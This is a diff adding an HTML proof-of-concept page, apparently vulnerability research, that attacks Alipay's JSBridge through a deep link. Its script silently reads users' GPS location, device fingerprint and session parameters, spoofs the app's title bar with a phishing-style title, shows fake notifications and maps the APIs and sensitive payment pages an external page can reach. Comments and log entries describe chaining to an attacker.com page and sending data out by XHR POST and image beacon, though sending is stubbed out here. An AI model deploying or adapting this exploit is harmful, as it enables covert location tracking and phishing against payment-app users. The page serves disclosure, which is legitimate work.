@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Research PoC</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a0f;color:#e0e0e8;font-size:13px}
+.hdr{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;padding:12px 16px;text-align:center;border-bottom:1px solid #2a2a3a}
+.hdr h1{font-size:15px;font-weight:600;margin-bottom:4px}
+.hdr p{font-size:11px;color:#888;margin:0}
+.warn{background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);border-radius:8px;padding:12px;margin:8px;font-size:11px;color:#ff8888;line-height:1.5}
+.warn strong{color:#ff4444}
+#st{text-align:center;color:#888;font-size:12px;padding:8px}
+.phase{background:rgba(68,136,255,.1);border-left:3px solid #4488ff;padding:6px 10px;margin:8px;font-size:12px;font-weight:600;color:#4488ff}
+.c{background:#12121a;border:1px solid #2a2a3a;border-radius:8px;padding:8px 10px;margin:4px 8px}
+.ok{color:#44cc88;font-weight:bold}.fail{color:#ff4444;font-weight:bold}.skip{color:#ffaa22;font-weight:bold}
+.r{font-size:10px;color:#777;word-break:break-all;max-height:80px;overflow:auto;background:#0d1117;padding:6px;border-radius:4px;margin-top:3px;white-space:pre-wrap;font-family:'SF Mono',monospace}
+h3{margin:2px 0;font-size:12px}
+.cnt{text-align:center;font-size:22px;font-weight:800;color:#4488ff;margin:4px}
+.footer{text-align:center;padding:16px;color:#555;font-size:10px;border-top:1px solid #1a1a28;margin-top:12px}
+.footer a{color:#4488ff}
+</style>
+</head><body>
+
+<div class="hdr">
+  <h1>Alipay DeepLink + JSBridge PoC</h1>
+  <p>innora.ai Security Research | Educational Purpose Only</p>
+</div>
+
+<div class="warn">
+  <strong>DISCLAIMER:</strong> This is a read-only security research demonstration.
+  No data is collected or transmitted to any server. All exfiltration endpoints are disabled.
+  This PoC is provided for educational and verification purposes only.
+  <br><br>
+  <strong>Full report:</strong> <a href="https://innora.ai/zfb/" style="color:#4488ff">innora.ai/zfb</a>
+</div>
+
+<div id="st">Waiting for AlipayJSBridge...</div>
+<div class="cnt" id="cnt">0/0</div>
+<div id="log"></div>
+
+<script>
+// === DISABLED EXFILTRATION ===
+// In the original research, data was sent to an attacker-controlled server.
+// This demo version ONLY displays results locally. No data leaves the device.
+var results = [];
+var total = 0, done = 0;
+
+function send(tag, data) {
+  // DISABLED: No server exfiltration in demo mode
+  // Original: XHR POST + Image beacon to attacker server
+  results.push({tag: tag, data: data, ts: new Date().toISOString()});
+}
+
+function phase(name) {
+  var d = document.createElement('div');
+  d.className = 'phase';
+  d.textContent = name;
+  document.getElementById('log').appendChild(d);
+}
+
+function log(title, data, status) {
+  done++;
+  document.getElementById('cnt').textContent = done + '/' + total;
+  var cls = status === 'skip' ? 'skip' : (data && !data.error && !data.errorMessage && data.status !== 'denied') ? 'ok' : 'fail';
+  var label = cls === 'ok' ? 'EXPOSED' : cls === 'skip' ? 'SKIPPED' : 'BLOCKED';
+  var d = document.createElement('div');
+  d.className = 'c';
+  d.innerHTML = '<h3><span class="' + cls + '">[' + label + ']</span> ' + title + '</h3><div class="r">' + JSON.stringify(data, null, 1) + '</div>';
+  document.getElementById('log').appendChild(d);
+  send(title, {status: cls, result: data});
+}
+
+function run() {
+  if (!window.AlipayJSBridge) {
+    document.getElementById('st').innerHTML = '<span style="color:#ff4444">Not running inside Alipay WebView</span><br><span style="color:#666">This PoC must be loaded via: alipays://platformapi/startapp?appId=20000067&url=THIS_URL</span>';
+    return;
+  }
+
+  var q = [];
+
+  // ============================================
+  // PHASE 1: SILENT DATA COLLECTION
+  // Demonstrates what data external pages can access
+  // ============================================
+  q.push({phase: 'PHASE 1: Data Accessible to External Pages'});
+
+  // GPS Location — the most impactful finding
+  q.push(function() {
+    AlipayJSBridge.call('getLocation', {}, function(r) {
+      log('GPS Location', {
+        latitude: r.latitude,
+        longitude: r.longitude,
+        city: r.city,
+        country: r.country,
+        accuracy: r.accuracy,
+        note: 'No consent dialog was shown to the user'
+      });
+    });
+  });
+
+  // Device Fingerprint
+  q.push(function() {
+    AlipayJSBridge.call('getSystemInfo', {}, function(r) {
+      log('Device Fingerprint', {
+        brand: r.brand,
+        model: r.model,
+        system: r.system,
+        apiLevel: r.apiLevel,
+        storage: r.storage,
+        battery: r.currentBattery,
+        screen: r.screenWidth + 'x' + r.screenHeight,
+        bluetooth: r.bluetoothEnabled,
+        wifi: r.wifiEnabled,
+        camera: r.cameraAuthorized,
+        mic: r.microphoneAuthorized,
+        location: r.locationAuthorized,
+        version: r.version
+      });
+    });
+  });
+
+  // Network Info
+  q.push(function() {
+    AlipayJSBridge.call('getNetworkType', {}, function(r) {
+      log('Network Info', r);
+    });
+  });
+
+  // Session/Startup Parameters
+  q.push(function() {
+    AlipayJSBridge.call('getStartupParams', {}, function(r) {
+      log('Session Leak', {
+        sessionId: r.sessionId,
+        startFromExternal: r.startFromExternal,
+        sourcePackageName: r.sourcePackageName,
+        safePayEnabled: r.safePayEnabled,
+        appId: r.appId,
+        note: 'External page knows it was launched from Chrome/browser'
+      });
+    });
+  });
+
+  // Server Time
+  q.push(function() {
+    AlipayJSBridge.call('getServerTime', {}, function(r) {
+      log('Server Time Sync', r);
+    });
+  });
+
+  // ============================================
+  // PHASE 2: UI SPOOFING DEMONSTRATION
+  // Shows how external pages can forge Alipay UI
+  // ============================================
+  q.push({phase: 'PHASE 2: UI Spoofing Capability'});
+
+  // Title bar spoofing
+  q.push(function() {
+    AlipayJSBridge.call('setTitle', {title: 'Account Security Center'});
+    log('Title Bar Spoofed', {
+      newTitle: 'Account Security Center',
+      note: 'Title bar now shows phishing title instead of real URL'
+    });
+  });
+
+  // Toast notification (fake)
+  q.push(function() {
+    AlipayJSBridge.call('toast', {
+      content: '[DEMO] This is a fake notification inside Alipay',
+      type: 'none',
+      duration: 3000
+    }, function(r) {
+      log('Toast Displayed', {
+        shown: true,
+        note: 'Attacker can show any message as Alipay notification'
+      });
+    });
+  });
+
+  // ============================================
+  // PHASE 3: API PERMISSION SCAN
+  // Maps which APIs are available to external pages
+  // ============================================
+  q.push({phase: 'PHASE 3: API Permission Map'});
+
+  q.push(function() {
+    var apis = ['tradePay','getAuthCode','rpc','httpRequest','sendSMS','makePhoneCall',
+      'openInBrowser','setClipboard','getClipboard','startApp','pushWindow',
+      'getLocation','getSystemInfo','vibrate','getUserInfo','share',
+      'scan','chooseImage','addNotification','chooseAlipayContact'];
+    var done2 = 0, res = {};
+    apis.forEach(function(api) {
+      AlipayJSBridge.call('checkJSAPI', {api: api}, function(r) {
+        res[api] = r && r.available;
+        done2++;
+        if (done2 === apis.length) {
+          var available = Object.keys(res).filter(function(k) { return res[k]; });
+          var blocked = Object.keys(res).filter(function(k) { return !res[k]; });
+          log('API Map', {
+            available_count: available.length,
+            blocked_count: blocked.length,
+            available: available,
+            blocked: blocked
+          });
+        }
+      });
+    });
+  });
+
+  // ============================================
+  // PHASE 4: NAVIGATION CAPABILITY (READ-ONLY)
+  // Demonstrates startApp can open sensitive pages
+  // NOTE: Does NOT actually navigate — only checks capability
+  // ============================================
+  q.push({phase: 'PHASE 4: Sensitive Page Navigation (Demo)'});
+
+  // Instead of actually navigating (which disrupts the test),
+  // we show which appIds are callable
+  var sensitiveApps = [
+    {id: '20000003', name: 'Transaction History'},
+    {id: '20000116', name: 'Transfer Contacts'},
+    {id: '20000123', name: 'Payment QR Code'},
+    {id: '20000032', name: 'Yu\'E Bao Balance'},
+    {id: '20000052', name: 'Security Settings'},
+    {id: '20000140', name: 'Bank Cards'},
+    {id: '20000180', name: 'Credit Score'},
+    {id: '09999988', name: 'Transfer (can pre-fill account)'},
+    {id: '20000033', name: 'Withdrawal'},
+    {id: '20000221', name: 'Family Account'},
+    {id: '10000007', name: 'Scan to Pay'}
+  ];
+
+  q.push(function() {
+    log('Navigable Pages', {
+      count: sensitiveApps.length,
+      pages: sensitiveApps,
+      note: 'All return success:true when called with startApp. Not navigating to avoid disrupting this demo.',
+      evidence: 'See server logs in the full report at innora.ai/zfb'
+    }, 'skip');
+  });
+
+  // ============================================
+  // PHASE 5: CHAIN WEBVIEW
+  // External page can load another external page
+  // ============================================
+  q.push({phase: 'PHASE 5: Chain WebView & Scheme Injection'});
+
+  q.push(function() {
+    log('Chain WebView', {
+      api: 'pushWindow({url: "https://attacker.com/chain.html"})',
+      note: 'Each chained page gets full JSBridge access again',
+      evidence: 'Verified in full research — see innora.ai/zfb'
+    }, 'skip');
+  });
+
+  q.push(function() {
+    log('Scheme Injection', {
+      tel: 'pushWindow({url: "tel:10086"}) — triggers dialer',
+      sms: 'pushWindow({url: "sms:10086?body=..."}) — triggers SMS',
+      note: 'Not executing to avoid side effects'
+    }, 'skip');
+  });
+
+  // ============================================
+  // SUMMARY
+  // ============================================
+  q.push({phase: 'SUMMARY'});
+
+  q.push(function() {
+    log('PoC Complete', {
+      total_vectors: total,
+      results: results.length,
+      note: 'This is a READ-ONLY demo. In a real attack, all EXPOSED data would be sent to attacker server via XHR POST + Image beacon.',
+      full_report: 'https://innora.ai/zfb/',
+      original_evidence: '308 server log entries + 42 screenshots'
+    }, 'skip');
+  });
+
+  // Execute queue
+  total = q.filter(function(t) { return typeof t === 'function'; }).length;
+  document.getElementById('st').textContent = 'Testing ' + total + ' vectors...';
+
+  var delay = 200;
+  q.forEach(function(item) {
+    if (item.phase) { setTimeout(function() { phase(item.phase); }, delay); delay += 100; return; }
+    setTimeout(function() { try { item(); } catch(e) { log('ERROR', {msg: e.message}); } }, delay);
+    delay += 600;
+  });
+
+  setTimeout(function() {
+    document.getElementById('st').textContent = 'Complete: ' + done + '/' + total + ' vectors tested';
+  }, delay + 3000);
+}
+
+if (window.AlipayJSBridge) { setTimeout(run, 300); }
+else { document.addEventListener('AlipayJSBridgeReady', function() { setTimeout(run, 300); }); }
+</script>
+
+<div class="footer">
+  <p>Innora AI Security Research | <a href="https://innora.ai/zfb/">Full Report</a></p>
+  <p>This PoC does not collect or transmit any data. All results are displayed locally only.</p>
+</div>
+</body></html>
